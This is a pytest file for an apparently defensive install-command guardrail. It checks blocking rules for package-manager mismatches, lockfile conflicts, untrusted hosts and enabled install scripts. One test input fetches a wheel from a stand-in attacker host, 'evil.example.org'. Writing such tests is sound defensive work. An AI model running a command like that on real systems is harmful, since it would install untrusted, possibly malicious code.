from __future__ import annotations

from pathlib import Path

from guardrail.checks import evaluate_command
from guardrail.detector import parse_command
from guardrail.policy import Policy


def test_blocks_manager_mismatch(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text("[project]\nname='x'\n", encoding="utf-8")
    cmd = parse_command("npm install lodash --ignore-scripts", tmp_path)
    result = evaluate_command(cmd, Policy(), tmp_path)
    assert result.should_block
    assert any(item.code == "manager.mismatch" for item in result.findings)


def test_blocks_multiple_node_lockfiles(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")
    (tmp_path / "yarn.lock").write_text("# lock", encoding="utf-8")

    cmd = parse_command("npm install lodash --ignore-scripts", tmp_path)
    result = evaluate_command(cmd, Policy(), tmp_path)
    assert result.should_block
    assert any(item.code == "lockfile.conflict" for item in result.findings)


def test_blocks_untrusted_host(tmp_path: Path) -> None:
    cmd = parse_command("pip install https://evil.example.org/pkg.whl", tmp_path)
    result = evaluate_command(cmd, Policy(), tmp_path)
    assert result.should_block
    assert any(item.code == "dependency.untrusted_host" for item in result.findings)


def test_blocks_script_enabled_for_js_install(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    cmd = parse_command("npm install react", tmp_path)
    result = evaluate_command(cmd, Policy(), tmp_path)
    assert result.should_block
    assert any(item.code == "scripts.enabled" for item in result.findings)


def test_warns_unknown_dependency(tmp_path: Path) -> None:
    policy = Policy(trusted_packages={"requests"})
    cmd = parse_command("pip install rich", tmp_path)
    result = evaluate_command(cmd, policy, tmp_path)
    assert not result.should_block
    assert any(item.code == "dependency.unknown" for item in result.findings)
